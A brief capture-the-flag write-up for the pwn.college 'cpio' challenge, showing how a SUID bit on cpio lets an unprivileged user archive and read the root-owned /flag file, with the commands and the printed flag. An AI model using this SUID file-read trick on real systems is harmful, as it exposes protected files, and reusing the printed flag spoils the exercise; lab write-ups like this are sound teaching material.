---
layout: page
title: "Challenge Name: cpio"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/cpio`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/cpio
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/cpio
```

-The `s` in `-rws` indicates it's a SUID binary.
-`cpio` runs with **root privileges**.

## 🚀 Exploitation

The `cpio` command in Linux just copies the content of a file to make a special archive file with .cpio extension.

We can simply cat the .cpio file to read contents of /flag

```bash
echo "/flag" | cpio -o > myflag.cpio
cat myflag.cpio
```

Output:
```
�q�vhl�:/flagpwn.college{sX5JKqLxT27oZ-lRdm_fF-WnI0C.dRjNxwSM0IzMyEzW}
�q
```
here we can clearly see the flag.
      
